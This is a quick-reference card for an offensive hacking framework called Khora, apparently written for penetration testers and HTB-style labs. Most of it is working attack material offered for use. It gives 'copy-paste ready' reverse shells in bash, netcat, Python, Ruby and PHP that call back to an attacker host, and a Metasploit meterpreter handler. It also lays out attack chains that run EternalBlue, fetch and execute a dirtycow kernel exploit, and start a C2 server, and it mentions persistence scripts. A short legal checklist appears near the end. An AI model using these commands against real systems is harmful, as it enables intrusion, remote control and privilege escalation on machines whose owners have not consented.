# Khora Quick Reference Card

## Installation (60 seconds)

```bash
git clone <repo> khora && cd khora
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
python3 client.py --list
```

---

## Essential Commands

### List Modules
```bash
python3 client.py --list
```

### Full Assessment
```bash
python3 client.py 192.168.1.100 10.10.14.1
```

### Single Module
```bash
python3 client.py 192.168.1.100 10.10.14.1 -m <module>
```

---

## Modules (Quick Reference)

| Command | Purpose |
|---------|---------|
| `-m nmap` | Network scanning |
| `-m backdoor` | Reverse shells + exploits |
| `-m rce` | Remote code execution |
| `-m eternalblue` | MS17-010 SMB |
| `-m c2` | C2 Server |
| `-m cracker` | Hash cracking |
| `-m jailbreak` | Privilege escalation |
| `-m dns_spoof` | DNS poisoning |
| `-m sniffer` | Packet capture |
| `-m blueborne` | Bluetooth exploit |

---

## Reverse Shells (Copy-Paste Ready)

### Bash
```bash
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

### Netcat
```bash
nc -e /bin/bash 10.10.14.1 4444
nc -e /bin/sh 10.10.14.1 4444
```

### Python (One-liner)
```bash
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```

### Python (Multi-line)
```python
import socket,subprocess,os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.1", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

### Ruby
```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.1",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### PHP
```bash
php -r '$sock=fsockopen("10.10.14.1",4444);while(1){if(feof($sock))break;$cmd=fgetc($sock);system($cmd);}fclose($sock);'
```

---

## Listener Setup (3 Options)

### Netcat (Recommended)
```bash
nc -lvnp 4444
```

### Netcat + Logging
```bash
nc -lvnp 4444 | tee shell_$(date +%s).log
```

### Bash Native
```bash
bash -i >& /dev/tcp/0.0.0.0/4444
```

### Metasploit
```bash
msfconsole
use exploit/multi/handler
set LHOST 10.10.14.1
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp  # or linux
run
```

---

## Common Attack Chains

### 1. HTB/Lab Target (Full)
```bash
# Reconnaissance
python3 client.py 10.10.11.59 10.10.14.1 -m nmap

# Generate payloads
python3 client.py 10.10.11.59 10.10.14.1 -m backdoor

# Start listener
nc -lvnp 4444 &

# Exploit
python3 client.py 10.10.11.59 10.10.14.1 -m rce
```

### 2. Windows Target (SMB)
```bash
# Scan
python3 client.py 192.168.1.100 10.10.14.1 -m nmap

# Generate Windows payload
python3 client.py 192.168.1.100 10.10.14.1 -m backdoor

# Exploit MS17-010
python3 client.py 192.168.1.100 10.10.14.1 -m eternalblue
```

### 3. Privilege Escalation
```bash
# Get foothold first (reverse shell)
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1

# Then from listener:
cd /tmp && wget http://10.10.14.1:8080/dirtycow
chmod +x dirtycow && ./dirtycow

# Or use jailbreak module
python3 client.py <target> <lhost> -m jailbreak
```

### 4. Full Chain (Sequential)
```bash
python3 client.py 192.168.1.100 10.10.14.1 --sequential
```

---

## Output Files

**After Assessment:**

```
results/
├── nmap_quick_YYYYMMDD_HHMMSS.txt      # Service discovery
├── nmap_vuln_YYYYMMDD_HHMMSS.txt       # Vulnerabilities
├── nmap_smb_YYYYMMDD_HHMMSS.txt        # SMB enumeration
├── nmap_summary_YYYYMMDD_HHMMSS.json   # JSON summary
└── session_YYYYMMDD_HHMMSS.json        # Full session report

payloads/
├── reverse_shells.txt                   # All variants
├── linux_x64_meter.elf                  # Linux payload
├── win_x64_meter.exe                    # Windows payload
├── listener_setup.sh                    # Listener script
└── persistence/
    ├── cron_linux.sh
    └── systemd_service.sh

exploits/
├── dirtycow                             # Compiled exploit
├── kernel_exp                           # Kernel POC
├── dirtycow.c                           # Source code
└── kernel_exp.c

logs/
└── khora_YYYYMMDD_HHMMSS.log           # Full execution log
```

---

## Troubleshooting Quick Fixes

| Problem | Solution |
|---------|----------|
| `nmap not found` | `sudo apt install nmap` |
| `ModuleNotFoundError: scapy` | `pip install scapy` |
| `Permission denied` | `sudo python3 client.py ...` |
| `Connection refused` | Check firewall, verify target IP |
| `Timeout` | Increase timeout or check network |
| `gcc not found` | `sudo apt install build-essential` |

---

## Advanced Options

### Custom Port
```bash
python3 client.py 192.168.1.100 10.10.14.1 -p 8888
```

### Custom Workers (Parallel)
```bash
python3 client.py 192.168.1.100 10.10.14.1 --workers 3
```

### Sequential Execution
```bash
python3 client.py 192.168.1.100 10.10.14.1 --sequential
```

### Verbose Output
```bash
python3 client.py 192.168.1.100 10.10.14.1 -v
```

---

## Legal Checklist

Before every engagement:

- [ ] Written authorization obtained
- [ ] Scope documented and agreed
- [ ] Rules of engagement reviewed
- [ ] Target backups created
- [ ] Disconnection plan established
- [ ] Findings reporting method agreed
- [ ] Cleanup procedures planned
- [ ] NDA/contract signed if needed

---

## Performance Tips

1. **Parallel Assessment**: Default (faster)
2. **Sequential Testing**: Use `--sequential` for stability
3. **Selective Modules**: Single module for focused testing
4. **Resource Monitoring**: Watch CPU/Memory during cracking
5. **Network Load**: Spread scans over time on constrained links

---

## Documentation Links

| Document | Purpose |
|----------|---------|
| README.md | Framework overview & usage |
| SECURITY.md | Security policies & disclosure |
| setup.md | Installation guide |
| CHANGELOG.md | Version history & improvements |
| Troubleshooting.md | Common issues & solutions |

---

## Emergency Shutdown

If things go wrong:

```bash
# Kill all processes
Ctrl+C

# Clean up
rm -rf payloads/ results/ exploits/ logs/

# Reset
python3 test_khora.py
```

---

## Support

**Need Help?**
- Review: `README.md`
- Check: `logs/khora_*.log`
- Test: `python3 test_khora.py`
- Community: Discord `2b53`

---

## One-Liner Cheatsheet

```bash
# Full assessment
python3 client.py 192.168.1.100 10.10.14.1

# Quick scan
python3 client.py 192.168.1.100 10.10.14.1 -m nmap

# Generate shells
python3 client.py 192.168.1.100 10.10.14.1 -m backdoor && cat payloads/reverse_shells.txt

# Start C2
python3 client.py 192.168.1.100 10.10.14.1 -m c2 &

# Listen for shells
nc -lvnp 4444

# Execute shell
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

---

**Khora v2.1 - Quick Reference Card**

*Print this for quick reference during engagements*
